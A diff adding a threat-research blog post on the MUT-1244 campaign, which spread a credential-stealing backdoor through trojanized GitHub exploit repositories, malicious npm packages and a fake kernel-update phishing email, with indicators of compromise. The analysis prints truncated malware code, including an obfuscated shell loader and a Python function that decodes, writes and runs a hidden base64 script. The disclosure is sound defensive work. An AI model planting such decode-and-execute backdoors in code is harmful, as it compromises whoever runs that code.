@@ -1,0 +1,215 @@
+
+Key points and observations
+
+In this post, we describe our in-depth investigation into a threat actor to which we have assigned the identifier MUT-1244.
+MUT-1224 uses two initial access vectors to compromise their victims, both leveraging the same second-stage payload: a phishing campaign targeting thousands of academic researchers and a large number of trojanized GitHub repositories, such as proof-of-concept code for exploiting known CVEs.
+Over 390,000 credentials, believed to be for WordPress accounts, have been exfiltrated to the threat actor through the malicious code in the trojanized "yawpp" GitHub project, masquerading as a WordPress credentials checker.
+Hundreds of victims of MUT-1244 were and are still being compromised. Victims are believed to be offensive actors—including pentesters and security researchers, as well as malicious threat actors— and had sensitive data such as SSH private keys and AWS access keys exfiltrated.
+We assess that MUT-1244 has overlap with a campaign tracked in previous research reported on the malicious npm package 0xengine/xmlrpc and the malicious GitHub repository hpc20235/yawpp.
+
+We would like to thank the team at SpyCloud for their support in this research.
+Summary
+Security professionals are a valuable target for threat actors, as they tend to have wide privileges and handle sensitive information. In 2022, a team at Leiden University in the Netherlands released a research paper showing that attackers commonly publish fake, trojanized exploit code, in the hope that someone will run it. More recently, research by Uptycs and SonicWall shows the opportunistic nature of these attacks, with threat actors publishing fake proof-of-concept exploit code as popular vulnerabilities get disclosed.
+In late November, a report was published  discussing a malicious npm package, 0xengine/xmlrpc, and an associated GitHub repository, hpc20235/yawpp. The report also describes a second-stage payload, hosted at https://codeberg[.]org/k0rn66/xmrdropper, which—contrary to its name—does more than just updating a cryptocurrency miner; it also backdoors the system and exfiltrates system information, private SSH keys, environment variables, and the content of select folders (such as ~/.aws) to the file sharing service file[.]io.
+In this post, we share the conclusion of our investigation on this threat actor, dubbed MUT-1244. We use the "MUT" (mysterious unattributed threat) designation to track clusters unattributed to a known threat actor. By leveraging open source intelligence (OSINT) techniques, we were able to uncover the full extent of the activities of MUT-1244. Notably, the attacker leverages several initial access techniques spread across a phishing campaign and dozens of trojanized GitHub repositories to deliver the same second-stage payload. Our investigation also uncovered that MUT-1244 was able to exfiltrate over 390,000 credentials, believed to be accounts for WordPress websites, by compromising unrelated threat actors who had access to these credentials.
+
+Initial access vectors
+MUT-1244 uses two primary methods to deliver the same malicious second-stage payload: a phishing campaign and attack tools published on GitHub. This latter method has several variations, which we describe in detail below.
+Fake kernel upgrade phishing campaign
+The attacker left a publicly available Git repository containing details about a phishing campaign targeting academics. The repository contained the phishing email itself, as well as a database of 2,758 target emails scraped from arXiv, a platform for research papers. The phishing email is titled "Notification: Important CPU Microcode Update for High-Performance Computing (HPC) Users Inbox" and asks the victim to install a fake kernel upgrade.
+When clicking the link, the victim is directed to https://www.opencompiled[.]org/patches/cpu-microcode-2024-09-21.html. Although this URL has been taken down, we were able to gather a screenshot from historical records:
+The victim is then presented a page that asks them to copy and paste a malicious piece of code. To our knowledge, this is the first documented "ClickFix"-type attack that targets Linux systems. When the victim executes the malicious command, the script patch-mc-0x129.sh from the GitHub repository opencompiled-oss/kernel-patch is executed. Although the script has been taken down, we were able to retrieve its contents through the Bing cache. The script drops the same second stage as reported in the original write-up, hosted at https://codeberg[.]org/k0rn66/xmrdropper.
+z="
+";xBz='ce >';rDz='$APP';VCz='CAL_';iDz='edBy';aBz='-m)'<snip>
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$z$Mz$Nz$Oz<snip>
+We reached out to a sample of the targeted users and were able to confirm that this email had been sent during the time window of October 5, 2024 to October 21, 2024. We share observed sending IPs in the Annex section.
+Malicious attack tools published on GitHub
+The second initial access vector that MUT-1244 utilizes is a set of malicious GitHub users publishing fake proof-of-concepts for CVEs. We've observed that these dozens of users form a cluster, often starring and forking each other's repositories. Most of them were created in October or November, have no legitimate activity, and have an AI-generated profile picture.
+The interactive graph below represents interactions (stars and forks) between malicious users, as observed from the GH Archive dataset. Hover on a repository or user to see additional details. A full screen version is available here.
+
+Two of the trojanized repositories were identified by a researcher on LinkedIn back in October. Below, we go into greater depth and expose 49 trojanized GitHub repositories, using four different techniques for initial access.
+The full list of malicious GitHub users and repositories can be found in Annex. All the malicious commits have the committer name of robert and a ProtonMail address. These characteristics make it easy to identify commits associated with MUT-1244 at scale—including in repositories that have been taken down—by using the GH Archive dataset.
+These dozens of malicious GitHub repositories are trojanized versions of proof-of-concept exploits that target known vulnerabilities. Repository names include, for instance:
+
+poc-CVE-2024-5057
+cve-2001-1473
+executable-pdf
+cve-2019-11248
+Due to their naming, several of these repositories are automatically included in legitimate sources, such as Feedly Threat Intelligence or Vulnmon, as proof-of-concept repositories for these vulnerabilities. This increases their look of legitimacy and the likelihood that someone will run them.
+
+Note: Services like Feedly and Vulnmon do not vouch for the legitimacy of these. Always exercise caution when running proof-of-concept code from unknown sources.
+
+All these repositories end up dropping the same second-stage payload as originally reported. However, they do so in several different ways.
+configure
+Several repositories (including m00n3rrr/poc-CVE-2001-1473) embed a legitimate and likely working exploit. However, they include a backdoor in the middle of a 45,000-line configure file that's seemingly used for compilation purposes.
+This payload is the same as the one in the "kernel upgrade" phishing campaign and decodes to the same one as used by 0xengine/xmlrpc, dropping the same second-stage payload.
+Some other repositories, such as r3s3tt/CVE-2021-31755 or g1thubb002/poc-CVE-2020-35489, embed the malicious payload inside of a binary file, such as a PDF. The fake exploit code then extracts and executes it.
+Some repositories, such as aib0litt/poc-CVE-2020-1938, copied legitimate exploit code and inserted a backdoor decoding a base64-encoded payload, then writing it to disk and executing it.
+def generate_payload(host, req_uri):
+	encoded_script = b"ej0iCiI7bEN6PSdQUklOJztYQ<SNIP>"
+	if os.name == 'posix':
+		try:
+			decoded_script = base64.b64decode(encoded_script)
+			script_path = '/tmp/install.sh'
+			with open(script_path, 'wb') as file:
+				file.write(decoded_script)
+			subprocess.run(['chmod', '+x', script_path], check=True)
+			result = subprocess.run(['bash', script_path], check=True, capture_output=True, text=True)
+		except subprocess.CalledProcessError as e:
+			print(f"Error occurred: {e.stderr}")
+Some repositories, such as hpc20235/pdf-watermark-remover, infect their victim indirectly by including the malicious npm package 0xengine/meow in the package.json.
+Analysis of this package, now available in our open source dataset, reveals that it also drops the same second-stage payload by decoding an embedded base64 string, writing it to disk, and executing it.
+Similarly, hpc20235/yawpp embeds the original malicious npm package, 0xengine/xmlrpc:
+{
+  "dependencies": {
+    "@0xengine/xmlrpc": "^1.3.18",
+    "..."
+}
+An unexpected discovery of hardcoded credentials
+The 0xengine/xmlrpc npm package and second-stage payload contain several hardcoded credentials:
+
+A Dropbox access token, with permissions to list and download the files exfiltrated by the attacker through the 0xengine/xmlrpc package
+A token for the file[.]io service, with permissions to list and download the files exfiltrated by the second-stage payload, applicable to all initial access vectors described in this post
+We assess that:
+
+Dozens of machines remain actively infected at the time of writing.
+MUT-1244 was able to compromise the system of dozens of victims, mostly red teamers, security researchers, and anyone with an interest in downloading PoC exploit code.
+This allowed MUT-1244 to gain access to sensitive information, including private SSH keys, AWS credentials, and command history. It was confirmed that a number of victims had cloned and executed the trojanized GitHub repositories, confirming the initial infection vector.
+MUT-1244 was able to compromise credentials, believed to be credentials for over 390,000 WordPress sites. We did not verify the validity of these credentials, but have strong indications that they do relate to Wordpress sites.
+In the next section, we lay out more detail on how such a massive amount of credentials came to be exfiltrated.
+How a trojanized credentials checker compromised over 390,000 credentials
+MUT-1244 was able to gain access to over 390,000 credentials, believed to be Wordpress ones. We assess with high confidence that before these credentials were exfiltrated to Dropbox, they were in the hands of offensive actors, who likely acquired them through illicit means. These actors were then compromised through the yawpp tool they used to check the validity of these credentials.
+Since MUT-1244 advertised yawpp as a "credentials checker" for WordPress, it's no surprise that an attacker with a set of stolen credentials (which are often purchased from underground markets as a way to speed up threat actor operations) would use yawpp to validate them.
+Conclusion
+The MUT-1244 investigation highlights how attackers are leveraging simple but effective methods, like trojanized tools and phishing campaigns, to target security professionals and researchers. It’s also a reminder to stay vigilant and thoroughly vet tools and sources before use.
+Thank you for reading! Feel free to reach out to us at securitylabs@datadoghq.com. You can also follow us on Bluesky and subscribe to our monthly newsletter.
+Annex: Indicators of compromise
+Phishing e-mail:
+
+Subject:
+Notification: Important CPU Microcode Update for High-Performance Computing (HPC) Users Inbox
+
+Observed senders: root@opencompiled.org or cicd@opencompiled.org
+Likely other senders: opencompiled@memeware.net
+Observed sending IP addresses: 94.156.177.14 and 37.120.193.124
+Observed sending dates: October 5 to October 21, 2024
+Malicious GitHub users:
+0x3ngine  
+0xget  
+0zzzer  
+aib0litt  
+aifuzzer  
+aitech66  
+altereg0x1  
+asmer2020  
+baesh3r  
+cpp4us  
+enter0x13  
+ethgeeks  
+g1thubb001  
+g1thubb002  
+g1thubb004  
+helmutkova1982  
+hpc20235  
+iqzer0  
+m00n3rr  
+m00n3rrr  
+maryakov  
+masm3264  
+n0dej5  
+n0s3ns33  
+nod3jzzz  
+nop2nop  
+opencompiled-oss  
+p1ton3rr  
+paulmuller1977  
+prj0cve  
+r3s3tt  
+reneww  
+rocomenji44  
+s3nd3rjz  
+un1k00rn  
+zipper2023
+Malicious GitHub repositories:
+0x3ngine/xmrdropper  
+0xget/cve-2001-1473  
+aib0litt/poc-CVE-2020-1938  
+aifuzzer/onlyfans  
+aifuzzer/poc-CVE-2020-35489  
+aifuzzer/pwnedu  
+aifuzzer/roche-biochemical-pathways  
+aitech66/bohemian-diffusion  
+aitech66/executable-pdf  
+aitech66/onlyfans  
+aitech66/poc-CVE-2020-35489  
+altereg0x1/poc-CVE-2019-11248  
+baesh3r/poc-CVE-2023-3824  
+cpp4us/cve-2019-11248  
+enter0x13/poc-CVE-2024-5057  
+ethgeeks/oneliners  
+ethgeeks/qzip2  
+g1thubb001/poc-CVE-2019-11248  
+g1thubb002/poc-CVE-2020-35489  
+g1thubb004/poc-CVE-2024-5057  
+helmutkova1982/bohemian-diffusion  
+hpc20235/gitlinkhunter  
+hpc20235/pdf-watermark-remover  
+hpc20235/qzip2  
+hpc20235/qzip3  
+hpc20235/yawpp  
+m00n3rrr/poc-CVE-2001-147  
+m00n3rrr/poc-CVE-2001-147"  
+m00n3rrr/poc-CVE-2001-1473  
+maryakov/executable-pdf  
+maryakov/opencompiled.org  
+masm3264/poc-CVE-2001-1473  
+masm3264/poc-CVE-2019-11248  
+masm3264/woocommerce-poc  
+n0dej5/gitlinkhunter  
+n0s3ns33/poc-cve-2023-21716  
+nocomp/poc-CVE-2001-1473  
+nod3jzzz/poc-CVE-2019-11248  
+nop2nop/cve-2019-11248  
+opencompiled-oss/opencompiled  
+p1ton3rr/poc-cve-2001-1473  
+paulmuller1977/pdf-watermark-remover  
+prj0cve/woocommerce-rce  
+prj0cve/yawpp  
+r3s3tt/CVE-2021-31755  
+reneww/poc-CVE-2020-25223  
+rocomenji44/PDF-Watermark-Remover  
+s3nd3rjz/poc-CVE-2020-1938  
+un1k00rn/poc-CVE-2024-5057
+Note: GitHub has taken down these users and repositories. It's likely that these lists are not exhaustive.
+0xengine/xmlrpc
+hpc20235/yawpp
+0xengine/xmlrpc
+hpc20235/yawpp
+https://codeberg[.]org/k0rn66/xmrdropper
+~/.aws
+https://www.opencompiled[.]org/patches/cpu-microcode-2024-09-21.html
+patch-mc-0x129.sh
+opencompiled-oss/kernel-patch
+https://codeberg[.]org/k0rn66/xmrdropper
+robert
+m00n3rrr/poc-CVE-2001-1473
+configure
+0xengine/xmlrpc
+r3s3tt/CVE-2021-31755
+g1thubb002/poc-CVE-2020-35489
+aib0litt/poc-CVE-2020-1938
+hpc20235/pdf-watermark-remover
+0xengine/meow
+hpc20235/yawpp
+0xengine/xmlrpc
+0xengine/xmlrpc
+0xengine/xmlrpc
+file[.]io
+yawpp
+yawpp
+yawpp
+root@opencompiled.org
+cicd@opencompiled.org
+opencompiled@memeware.net
+94.156.177.14
+37.120.193.124
